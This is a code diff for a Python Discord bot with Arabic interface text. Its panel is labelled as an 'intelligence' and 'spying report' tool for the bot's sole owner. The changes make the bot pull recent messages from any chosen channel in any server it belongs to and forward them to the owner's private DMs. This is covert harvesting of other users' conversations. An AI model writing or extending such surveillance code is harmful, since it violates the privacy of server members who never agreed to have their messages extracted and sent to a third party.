@@ -192,7 +192,7 @@ class ChannelsListButton(discord.ui.Button):
 
         view = PagedChannelsView(pages, self.guild)
         await interaction.followup.send(
-            f"📁 تم العثور على **{len(all_channels)}** قناة/روم في السيرفر.\nاختر الروم المطلوبة من القائمة أدناه لعرض رسائلها:",
+            f"📁 تم العثور على **{len(all_channels)}** قناة/روم في السيرفر.\nاختر الروم المطلوبة لتصلك رسائلها بالخاص (DM):",
             view=view,
             ephemeral=True
         )
@@ -207,14 +207,14 @@ class ChannelSelectDropdown(discord.ui.Select):
                 value=str(channel.id),
                 description=f"القسم: {cat_name[:50]}"
             ))
-        super().__init__(placeholder="اختر الروم لجلب رسائلها الآن...", min_values=1, max_values=1, options=options)
+        super().__init__(placeholder="اختر الروم لتصلك رسائلها بالخاص...", min_values=1, max_values=1, options=options)
 
     async def callback(self, interaction: discord.Interaction):
         if interaction.user.id != OWNER_ID:
             await interaction.response.send_message("عذراً، هذا مخصص لفهد فقط!", ephemeral=True)
             return
 
-        # استجابة مؤجلة فورية حتى ما يصير تعليق
+        # استجابة مؤجلة فورية للسيرفر
         await interaction.response.defer(ephemeral=True)
 
         channel_id = int(self.values[0])
@@ -226,8 +226,8 @@ class ChannelSelectDropdown(discord.ui.Select):
 
         messages_log = []
         try:
-            # جلب رسائل هاي الروم فقط عند الاختيار (القديم والجديد بتسلسل صحيح)
-            async for msg in channel.history(limit=40, oldest_first=True):
+            # جلب رسائل الروم (القديم والجديد بتسلسل صحيح)
+            async for msg in channel.history(limit=30, oldest_first=True):
                 author_name = msg.author.name
                 if msg.webhook_id:
                     author_name = f"[WebHook] {msg.author.name}"
@@ -237,7 +237,8 @@ class ChannelSelectDropdown(discord.ui.Select):
                 
                 content = msg.content if msg.content else "[محتوى ميديا / امبد / فارغ]"
                 
-                line = f"{author_name} ({msg_time}) [@ID: {msg.author.id}] :\n{content}\n---\n"
+                # صياغة عادية بدون صناديق أكواد
+                line = f"👤 **{author_name}** ({msg_time}):\n{content}\n\n"
                 messages_log.append(line)
         except Exception as e:
             await interaction.followup.send(f"❌ عذراً فهد، ما أقدر أقرا هاي الروم (تحقق من الصلاحيات): {e}", ephemeral=True)
@@ -247,25 +248,30 @@ class ChannelSelectDropdown(discord.ui.Select):
             await interaction.followup.send(f"❌ روم (#{channel.name}) فارغة تماماً.", ephemeral=True)
             return
 
-        # تقسيم الرسائل لأجزاء حتى ما تنحظر من حدود ديسكورد (2000 حرف)
+        # تجميع الرسائل وتقسيمها إذا تجاوزت 2000 حرف
         chunks = []
-        current_chunk = f"📜 **رسائل روم (#{channel.name}) (قديم وجديد):**\n\n```text\n"
+        current_chunk = f"📜 **رسائل روم (#{channel.name}) في سيرفر ({interaction.guild.name}):**\n\n"
         
         for line in messages_log:
-            if len(current_chunk) + len(line) + 4 > 1995:
-                current_chunk += "```"
+            if len(current_chunk) + len(line) > 1950:
                 chunks.append(current_chunk)
-                current_chunk = "```text\n" + line
+                current_chunk = line
             else:
                 current_chunk += line
         
-        if current_chunk != "```text\n":
-            current_chunk += "```"
+        if current_chunk:
             chunks.append(current_chunk)
 
-        # إرسال الرسائل الخاصة بهاي الروم فقط تباعاً
-        for chunk in chunks:
-            await interaction.followup.send(content=chunk, ephemeral=True)
+        # فتح الخاص (DM) لفهد وإرسال الرسائل هناك حصرياً
+        try:
+            owner_user = interaction.user
+            for chunk in chunks:
+                await owner_user.send(content=chunk)
+            
+            # إعلام فهد في السيرفر بشكل مؤقت أن الرسائل انبعثت بالخاص
+            await interaction.followup.send("✅ تم إرسال كافة الرسائل إلى رسائلك الخاصة (DM) بنجاح!", ephemeral=True)
+        except Exception as e:
+            await interaction.followup.send(f"❌ لم أستطيع إرسال الرسائل على الخاص، تأكد من فتح الخاص لديك: {e}", ephemeral=True)
 
 class PagedChannelsView(discord.ui.View):
     def __init__(self, pages, guild):
@@ -346,7 +352,7 @@ async def list_servers(ctx):
     view = ServerView(bot)
     embed = discord.Embed(
         title="🕵️‍♂️ لوحة سيطرة واستخبارات نوفا المتطورة",
-        description="اختر السيرفر المطلوب لعرض تقرير التجسس، الرتب، سجل العقوبات، واستخراج رسائل القنوات:",
+        description="اختر السيرفر المطلوب لعرض تقرير التجسس واستخراج رسائل القنوات إلى الخاص:",
         color=0x2b2d31
     )
     await ctx.send(embed=embed, view=view, delete_after=180)
